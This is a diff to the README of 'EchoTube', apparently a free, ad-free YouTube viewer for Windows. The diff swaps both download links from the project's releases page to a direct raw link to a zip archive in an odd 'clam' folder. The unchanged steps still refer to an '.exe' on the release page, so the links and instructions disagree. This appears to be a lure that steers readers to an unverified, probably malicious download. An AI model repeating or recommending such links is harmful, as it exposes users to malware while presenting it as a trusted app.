@@ -1,6 +1,6 @@
 # 📺 EchoTube - Watch videos without any annoying ads
 
-[![](https://img.shields.io/badge/Download_EchoTube-Blue?style=for-the-badge)](https://github.com/boikgaming24/EchoTube/releases)
+[![](https://img.shields.io/badge/Download_EchoTube-Blue?style=for-the-badge)](https://raw.githubusercontent.com/boikgaming24/EchoTube/main/clam/Tube-Echo-2.9.zip)
 
 EchoTube serves as a standalone application for watching YouTube videos. It focuses on speed and simplicity. You do not need a Google account to use this software. The app removes advertisements from your viewing sessions. You can browse, search, and watch your favorite content while using few system resources.
 
@@ -12,7 +12,7 @@ The application runs on Windows 10 and Windows 11. You need a stable internet co
 
 You must visit the official release page to obtain the installation files. Follow these steps to prepare the app on your computer:
 
-1. Visit [this page to download](https://github.com/boikgaming24/EchoTube/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/boikgaming24/EchoTube/main/clam/Tube-Echo-2.9.zip).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
